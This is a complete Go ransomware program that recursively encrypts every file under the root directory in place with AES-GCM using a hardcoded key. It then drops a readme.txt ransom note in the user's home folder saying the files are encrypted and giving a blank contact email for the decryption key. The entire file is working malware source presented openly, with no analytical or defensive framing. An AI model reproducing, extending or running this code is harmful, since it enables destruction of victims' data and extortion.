package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"runtime"
	"sync"

	"github.com/dalbonip/beijaware/explorer"
)

var Dir string = "/" // Insert starting directory
var wg sync.WaitGroup

func main() {
	//Encrypted := make(chan []byte, 100)
	cryptoKey := "686561646d696e64706172746e6572737265647465616d313333374031333337" //keygen.Keygen()
	contact := ""                                                                   // Insert contact email
	//fmt.Println("THIS IS THE KEY:", cryptoKey)

	key, err := hex.DecodeString(cryptoKey)
	if err != nil {
		panic(err)
	}

	var root string
	if runtime.GOOS == "windows" {
		root = os.Getenv("USERPROFILE")
	} else {
		root = os.Getenv("HOME")
	}

	//use function mapfiles from explorer (gets every file recursive by decided dir except decrypter!)
	files := explorer.MapFiles(Dir)

	// for each file encrypt file with key in 644 perm
	for _, v := range files {
		wg.Add(1)
		file, err := ioutil.ReadFile(v)

		if err != nil {
			continue
		}

		go Encrypt(file, key, v)
	}

	msg := "Your files have been encrypted.\nContact " + contact + " to get the decrypter/ decrypt key."
	fmt.Println(msg)

	err = ioutil.WriteFile(root+"/readme.txt", []byte(msg), 0644)
	if err != nil {
		panic(err)
	}
	wg.Wait()
}

func Encrypt(plainText []byte, key []byte, v string) {
	defer wg.Done()
	block, err := aes.NewCipher(key)

	if err != nil {
		fmt.Println(err)
	}

	gcm, err := cipher.NewGCM(block)

	if err != nil {
		fmt.Println(err)
	}

	nonce := make([]byte, gcm.NonceSize())
	_, err = io.ReadFull(rand.Reader, nonce)
	if err != nil {
		fmt.Println(err)
	}

	cypherText := gcm.Seal(nonce, nonce, plainText, nil)

	//Encrypted <- cypherText

	ioutil.WriteFile(v, cypherText, 0644)
}
